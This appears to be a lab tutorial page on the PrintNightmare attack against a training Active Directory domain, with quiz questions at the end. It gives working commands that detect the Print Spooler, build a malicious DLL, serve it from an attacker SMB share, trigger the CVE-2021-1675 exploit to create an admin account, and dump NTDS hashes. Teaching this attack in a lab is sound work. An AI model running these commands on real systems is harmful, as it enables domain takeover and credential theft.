#PrintNightmare Attack

In this attack, the Print Spooler service will be abused. This service used to allow users to upload their own printer drivers to enable easy network printer sharing. A printer driver is a software component that basically acts as a translator between computers and printers. These drivers could be uploaded by users to machines running the Print Spooler service, and the dangerous part is that the Print Spooler service runs as SYSTEM. Meaning that printer drivers are run as SYSTEM as well.

An attacker could then upload mallicious code disguised as a printer driver to a machine running the vulnerable service. 

The Print Spooler service runs on DCs by default. An attacker can then potentially upload a printer driver that creates a new user and adds this user to the local administrators group. And as simple as that, the attacker would then have administrative privileges on the DC itself.

To execute this attack, we can first assess if CAPTAIN provides the Print Spooler service:
```
crackmapexec smb 192.168.122.10 -M spooler
```

Lucky for us, the CAPTAIN DC does provide the vulnerable service. Now, create a file named 'pnightmare.c' inside the 'pnightmare' directory, with the contents seen in [pnightmare.c](../single-domain-attacks/pnightmare.c). This code will create a user called 'printersplitter' with password 'Passw0rd' and add the user to the local administrators group.

Now, compile the code, start an SMB share so that the DC can retrieve the driver, and finally trigger the DC to retrieve the driver:
```
x86_64-w64-mingw32-gcc -shared -o pnightmare.dll pnightmare.c
sudo -E python3 /home/ubuntu/.local/bin/smbserver.py -smb2support ATTACKERSHARE . & 
#press ENTER
python3 CVE-2021-1675.py polaris.local/skyler.white:'Password123'@captain.polaris.local '\\192.168.122.2\ATTACKERSHARE\pnightmare.dll'
```

Now the attacker holds new administrative credentials, and can use them to dump domain user's hashes, for example, compromising every single user account:
```
crackmapexec smb captain.polaris.local -u printersplitter -p 'Passw0rd' --ntds
```

!!! question
    Which Windows service is being targetted by the PrintNightmare attack?
??? success "Answer"
    The Print Spooler service, namely, the fact that it allowed users to upload arbitrary printer drivers.
!!! question
    Under which security context can attacker code be executed through this attack?
??? success "Answer"
    Through the PrintNightmare attack, an attacker can execute code under the SYSTEM security context.
!!! question
    Which method from the Spooler service does the attacker use to upload this arbitrary driver to the DC?
??? success "Answer"
    RpcAddPrinterDriverEx is abused to make the DC retrieve and install a malicious driver DLL from the attacker’s SMB share.
